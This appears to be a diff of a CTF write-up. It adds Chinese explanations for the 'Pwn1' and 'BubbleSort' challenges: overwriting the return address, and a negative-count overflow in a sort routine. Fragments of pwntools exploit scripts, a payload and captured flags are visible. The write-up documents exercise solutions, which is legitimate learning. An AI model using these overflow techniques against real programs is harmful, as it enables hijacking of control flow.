@@ -9,6 +9,9 @@ FLAG{Hello CTF}
 ```
 
 ### Pwn1
+
+直接將Return Address蓋掉即可
+
 ```python=
 #!/usr/bin/env python
 
@@ -31,9 +34,12 @@ FLAG{BuFFer_0V3Rflow_is_too_easy}
 
 
 ### BubbleSort
+在要求輸入需要sort幾個elment的部分發現輸入負數會導致程式進行overflow的sort
+因此，我們可利用這個漏洞來達到將return address置換成我們所需要的值。
+
 ```python=
 #!/usr/bin/env python
-
+#
 from pwn import *
 
 payload = '127' + '\n' + '134514048 '
